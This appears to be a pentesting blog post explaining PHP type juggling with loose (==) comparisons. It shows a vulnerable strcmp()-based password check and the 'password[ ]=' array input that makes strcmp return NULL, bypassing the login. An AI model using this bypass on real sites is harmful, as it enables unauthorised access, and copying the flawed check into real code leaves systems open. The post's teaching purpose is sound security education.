---
title: Auth bypass with PHP type Juggling
author: Udesh
date: 2020-10-29
categories: [Pentesting]
---
### Definition

PHP is known as a dynamically typed language. PHP does not require explicit type definition in variable declaration. a variable when assigned value of different type, its type too change. This approach of PHP to deal with dynamically changing value of variable is called type juggling. If a string value is assigned to variable $var, $var becomes a string. If an integer value is then assigned to $var, it becomes an integer. 

PHP has two main comparison modes, lets call them loose (==) and strict (===). Loose comparisons have a set of operand conversion rules to make it easier for developers.

Consider the following.

    TRUE: "0000" == int(0)
    TRUE: "0e12" == int(0)
    TRUE: "1abc" == int(1)
    TRUE: "0abc" == int(0)
    TRUE: "abc"  == int(0)
	TRUE: " " == int(0)

```php
if (1 == $variable) {
    // do something
}
```
```php
$variable = "1 and a half";
var_dump (1 == $variable);
```
The result is bool(true)

### Example vulnerable code

![cord.PNG]({{site.baseurl}}/assets/img/post/post4/cord.PNG)

How would you use this function?
```php
if (strcmp($_POST['password'], '$pass') == 0) {  
	// do authenticated things
}
```
If you can control ` $_POST['password']`, you can distrupt above auth check . 

This is the normal way of posting a password.
```php
password=$pass
```

![req1.PNG]({{site.baseurl}}/assets/img/post/post4/req1.PNG)

What happen if we submit an array instead of POSTING a password string.
```php
password[ ]=
```
PHP translates POST varialbes like this to an empty array which causes strcmp() to barf
```php
strcmp(array(), "your password") -> NULL
```
![req2.PNG]({{site.baseurl}}/assets/img/post/post4/req2.PNG)

we can bypass the login

Lets take a look at the strcmp usage again

```php
if (strcmp($_POST['password'], '$pass') == 0) { 
// do authenticated things
}
```
Lucky for us, thanks to type juggling, NULL == 0. Auth bypass!!!. 😎

### References 
01. [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling)
02. [https://www.php.net/manual/en/language.types.type-juggling.php](https://www.php.net/manual/en/language.types.type-juggling.php)

